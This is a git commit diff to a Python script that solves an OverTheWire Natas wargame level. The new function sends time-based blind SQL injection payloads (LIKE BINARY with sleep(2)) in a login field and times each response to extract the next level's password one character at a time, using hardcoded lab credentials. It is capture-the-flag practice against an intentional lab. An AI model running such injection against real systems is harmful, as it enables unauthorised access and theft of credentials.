54a01ef8e15c2110906b9f7d6e54bb06871bd52e
Alan123alan <alancastellanos2@hotmail.com>
2023-11-17 22:08:54 -0600

    added function to get natas18 password

--- natas/request.py
+++ natas/request.py
@@ -1,7 +1,9 @@
 from requests import post, get
 from requests.exceptions import RequestException
 from requests.auth import HTTPBasicAuth
+from datetime import timedelta
 
+alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 def get_natas_11_password():
     auth = HTTPBasicAuth("natas10", "D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE")
@@ -14,7 +16,6 @@ def get_natas_11_password():
 
 def get_natas_17_password():
     auth = HTTPBasicAuth("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")
-    alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     dictionary = []
     for char in alpha :
         try:
@@ -44,5 +45,29 @@ def get_natas_17_password():
     # print("".join(password))
             
 
+def get_natas_18_password():
+    auth = HTTPBasicAuth("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")
+    dictionary = []
+    confirmation_time_delta = timedelta(seconds=2.0)
+    for char in alpha:
+        response = post("http://natas17.natas.labs.overthewire.org/index.php", data={"username": 'natas18" and  password LIKE BINARY "%'+char+'%" AND sleep(2) #'}, auth=auth)
+        if response.elapsed >= confirmation_time_delta:
+            dictionary.append(char)
+        print(dictionary)
+    password = []
+    for _ in range(32):
+        for char in dictionary:
+            password.append(char)
+            print("password before post", password)
+            print("password before post", "".join(password))
+            response = post("http://natas17.natas.labs.overthewire.org/index.php",data={"username":'natas18" and password LIKE BINARY "'+"".join(password)+'%" AND sleep(2) #'}, auth=auth)
+            if response.elapsed >= confirmation_time_delta:
+                break
+            else:
+                password.pop()
+            print("Delta: ", response.elapsed, " Char: ", char)
+    print("".join(password))
+
+
 if __name__ == "__main__":
-    get_natas_17_password()
+    get_natas_18_password()
